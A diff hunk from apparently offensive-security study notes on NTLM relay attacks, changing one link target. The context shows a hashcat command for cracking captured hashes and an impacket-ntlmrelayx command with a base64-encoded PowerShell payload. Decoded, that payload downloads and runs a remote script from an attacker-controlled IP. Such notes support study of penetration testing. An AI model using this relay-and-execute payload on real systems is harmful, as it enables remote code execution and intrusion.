@@ -314,7 +314,7 @@ hashcat.exe -m 5600 hash.txt rockyou.txt
 * Net-NTLM hash (NTLMv2) can't be used for pass-the-hash attack
 * Can be used for relay attacks tho
 
-- Generate [powershell shellcode runner b64 command](../exploitation/amsi-bypass.md#powershell-shellcode-runner)
+- Generate [powershell shellcode runner b64 command](../good-exploit-code/osep-good-code.md#powershell-shellcode-runner)
 - Force SMB request from SQL server --> Relay it to APPSRV01
   * ```bash
     sudo impacket-ntlmrelayx --no-http-server -smb2support -t <Dest IP of the relay> -c 'powershell -enc cG93ZXJzaGVsbCAtYyBJRVggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTIuMTY4LjQ1LjE5Ny9ydW5hbGwucHMxJyk='
